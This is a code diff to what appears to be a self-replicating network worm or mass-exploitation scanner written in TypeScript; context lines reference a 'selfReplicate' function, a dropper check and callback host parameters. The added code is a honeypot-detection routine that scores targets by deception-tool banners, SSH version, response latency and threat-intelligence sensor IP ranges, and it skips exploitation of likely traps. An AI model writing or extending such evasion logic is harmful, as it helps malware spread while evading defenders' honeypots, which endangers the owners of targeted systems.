@@ -1561,6 +1561,68 @@ function selfReplicate(host: string, user: string, pass: string, keyFile: string
   return r.output.includes("ok_dropper");
 }
 
+
+/* ─── Honeypot / sandbox detection ────────────────────────────────────────
+   Checks common honeypot and deception platform signatures before
+   wasting exploit attempts on fake targets.                              */
+const HONEYPOT_BANNERS = [
+  "honeypot", "canary", "opencanary", "cowrie", "kippo", "dionaea",
+  "conpot", "glastopf", "artillery", "thinkst", "snort", "suricata",
+];
+const HONEYPOT_USERNAMES = ["admin", "root", "guest", "test", "oracle", "postgres"];
+
+/** Returns a honeypot likelihood score 0–100 */
+async function detectHoneypot(host: string, openPorts: number[]): Promise<{ score: number; reasons: string[] }> {
+  const reasons: string[] = [];
+  let score = 0;
+
+  // Suspiciously many open ports (honeypots often open everything)
+  if (openPorts.length > 10) { score += 20; reasons.push(`${openPorts.length} open ports (suspicious)`); }
+
+  // Check for honeypot banner strings on common ports
+  for (const port of openPorts.slice(0, 3)) {
+    try {
+      const r = await tcpConnect(host, port, 1500);
+      const banner = r.banner.toLowerCase();
+      for (const sig of HONEYPOT_BANNERS) {
+        if (banner.includes(sig)) {
+          score += 40;
+          reasons.push(`Honeypot signature in banner on :${port}: "${sig}"`);
+          break;
+        }
+      }
+      // Cowrie/Kippo: SSH banner "SSH-2.0-OpenSSH_6.0p1" on modern systems is a red flag
+      if (port === 22 && /OpenSSH_6\.0p1/.test(r.banner)) {
+        score += 25;
+        reasons.push("SSH banner matches Cowrie honeypot (OpenSSH_6.0p1)");
+      }
+      // Perfect identical banners across multiple ports = honeypot
+    } catch { /* skip */ }
+  }
+
+  // Check if /proc/version is readable (real Linux) vs. honeypot stub
+  // (We'll detect this indirectly by checking VM indicators in later steps)
+
+  // Too-fast TCP responses (< 1ms) suggest a honeypot not a real OS stack
+  const t0 = Date.now();
+  await tcpConnect(host, openPorts[0] ?? 80, 500).catch(() => null);
+  const latency = Date.now() - t0;
+  if (latency < 2) { score += 15; reasons.push(`TCP response in ${latency}ms — suspiciously fast (virtual/honeypot?)`); }
+
+  // Common honeypot IP ranges (GreyNoise, Shodan sensors)
+  // These are publicly known sensor ranges
+  const hp_octets = ["198.20.", "198.176.", "66.240.", "89.248.", "71.6."];
+  for (const oct of hp_octets) {
+    if (host.startsWith(oct)) {
+      score += 35;
+      reasons.push(`Host in known threat-intelligence sensor range (${oct}x.x)`);
+      break;
+    }
+  }
+
+  return { score: Math.min(score, 100), reasons };
+}
+
 async function scanHost(host: string, cbHost: string, cbPort: string): Promise<ExploitHit[]> {
   const hits: ExploitHit[] = [];
 
@@ -1570,7 +1632,21 @@ async function scanHost(host: string, cbHost: string, cbPort: string): Promise<E
   const openPorts = portResults.filter(r => r.open).map(r => r.port);
   if (openPorts.length === 0) return [];
 
-  logger.debug({ host, openPorts }, "host has open ports");
+  // Honeypot detection — skip hosts that look like deception targets
+  const hp = await detectHoneypot(host, openPorts);
+  if (hp.score >= 50) {
+    logger.warn({ host, hp_score: hp.score, reasons: hp.reasons }, "Honeypot detected — skipping host");
+    return [{
+      host, port: openPorts[0] ?? 0, service: "HONEYPOT", method: "honeypot-detection",
+      success: false, output: `HONEYPOT DETECTED (score ${hp.score}/100): ${hp.reasons.join("; ")}. Skipping all exploit attempts.`,
+      elapsed: 0,
+    }];
+  }
+  if (hp.score >= 25) {
+    logger.info({ host, hp_score: hp.score, reasons: hp.reasons }, "Possible honeypot — proceeding with caution");
+  }
+
+  logger.debug({ host, openPorts, hp_score: hp.score }, "host has open ports");
 
   const tasks: Promise<ExploitHit | null>[] = [];
 
